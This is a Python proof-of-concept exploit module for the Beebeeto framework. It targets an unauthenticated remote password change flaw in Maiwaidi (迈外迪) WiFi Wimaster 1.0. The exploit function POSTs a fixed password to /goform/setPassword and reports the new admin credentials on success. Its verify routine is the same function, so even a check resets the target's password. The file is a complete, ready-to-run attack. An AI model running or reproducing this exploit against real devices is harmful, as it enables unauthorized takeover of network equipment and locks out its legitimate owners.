#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0140',  
            'name': '迈外迪wifi Wimaster 1.0 远程密码修改漏洞 Exploit', 
            'author': 'Cp',  
            'create_date': '2015-09-22',  
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  
            'port': [80],  
            'layer3_protocol': ['tcp'],  
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '迈外迪', 
            'vul_version': ['1.0'],  
            'type': 'Remote Password Change', 
            'tag': ['迈外迪漏洞', 'remote-pass-change'],  
            'desc': '迈外迪wifi的Wimaster未授权直接修改密码漏洞', 
            'references': ['http://wooyun.org/bugs/wooyun-2015-0131933',  
                           ],
        },
    }

    @classmethod
    def exploit(cls, args):  
        payload = '/goform/setPassword'
        pocdata = 'password=beebeeto1'
        if args['options']['verbose']:  
            print '[*] {url} - Reset Password to [beebeeto1] ...'.format(url=args['options']['target'])
        request = urllib2.Request(args['options']['target'] + payload, data=pocdata) 
        response = urllib2.urlopen(request).read()
        if 'success' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target'] + payload
            args['poc_ret']['username'] = 'Empty'
            args['poc_ret']['password'] = 'beebeeto1'
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())